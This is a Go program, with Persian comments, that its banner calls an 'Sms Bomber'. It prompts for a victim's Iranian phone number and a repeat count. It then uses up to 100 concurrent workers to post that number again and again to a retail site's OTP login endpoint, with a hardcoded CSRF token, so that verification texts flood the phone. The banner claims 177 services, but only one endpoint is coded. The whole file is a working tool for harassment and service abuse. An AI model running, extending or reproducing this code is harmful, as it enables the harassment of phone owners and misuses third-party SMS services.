//inja faghat kod ha ro test mikoni.


package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	// ... (بخش چاپ لوگو - بدون تغییر)
	fmt.Print("\033[01;32m")
	fmt.Print(`
                                 :-.
                          .:  =#-:-----:
                            **%@#%@@@#*+==:
                        :=*%@@@@@@@@@@@@@@%#*=:
                     -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                 . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
               .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
              =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
             :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
             #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
            .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
            =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
            +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
            =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
            .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
             -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:
              *@@%#            -@@@@@@.            #@@@+
              .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
               :@@*           =%@@@@@@%-  faster   *@@:
               #@@%          .*@@@@#%@@@%+.        %@@+
               %@@@+      -#@@@@@* :%@@@@@*-      *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
               *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=
                #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                 =%@@@@@@@@@@@@* :#+.#@@@@@@@@@@@@#-
                   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                      #@@@@@@@@@@@@@@@@@@@@@@+
                       *@@@@@@@@@@@@@@@@@@@@+
                        +@@%*@@%@@@%%@%*@@%=
                         +% %%.+@%:-@* *%-
                          . %# .%#  %+
                            :. %+ :.
                              -:
`)
	fmt.Print("\033[0m")
	// ... (پایان بخش چاپ لوگو)


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// --- بخش جدید برای انتخاب سرعت ---
	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int // متغیر برای نگهداری تعداد کارگرها

	// تعیین تعداد کارگرها بر اساس انتخاب کاربر
	switch strings.ToLower(speedChoice) { // تبدیل ورودی به حروف کوچک برای مقایسه آسان‌تر
	case "fast":
		// مقداری بالاتر برای سیستم‌های قوی‌تر
		// این عدد رو می‌تونید با تست روی گوشی‌های قوی‌تر تنظیم کنید.
		// مثلاً چند برابر تعداد هسته‌های CPU یا یک عدد ثابت بالاتر.
		// runtime.NumCPU() * 4 یا یک عدد ثابت مثل 100 یا 150
		numWorkers = 100 // مثال: برای حالت سریع 100 کارگر
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		// مقداری محافظه‌کارانه برای سیستم‌های ضعیف‌تر یا حالت پیش‌فرض
		// یک عدد ثابت پایین‌تر
		numWorkers = 30 // مثال: برای حالت متوسط 30 کارگر
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		// اگر ورودی معتبر نبود، از حالت متوسط استفاده می‌کنیم
		numWorkers = 30 // پیش‌فرض به حالت متوسط
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}
	// --- پایان بخش جدید ---


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// اندازه کانال وظایف می‌تواند بر اساس repeatCount و تعداد APIها باشد.
	// فعلاً بر اساس کد شما repeatCount * 40 باقی می‌ماند.
	tasks := make(chan func(), repeatCount*40)

	// numWorkers حالا بر اساس انتخاب کاربر تنظیم شده است
	// numWorkers := 20 // این خط دیگر لازم نیست

	var wg sync.WaitGroup
	// اندازه کانال نتایج هم بر اساس repeatCount * 40 باقی می‌ماند.
	ch := make(chan int, repeatCount*40)

	// ایجاد Goroutineهای کارگر با تعداد numWorkers تعیین شده
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// پر کردن کانال tasks با وظایف ارسال درخواست
	for i := 0; i < repeatCount; i++ {
		// 2. itmall.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob")
			formData.Set("countrycode", "+98")
			formData.Set("mobileNo", phone)
			formData.Set("csrf", "e57d035242")
			formData.Set("login", "2")
			formData.Set("username", "")
			formData.Set("email", "")
			formData.Set("captcha", "")
			formData.Set("captcha_ses", "")
			formData.Set("json", "1")
			formData.Set("whatsapp", "0")
			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// برای APIهای دیگر هم وظایف مشابه را اینجا اضافه می‌کنید
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
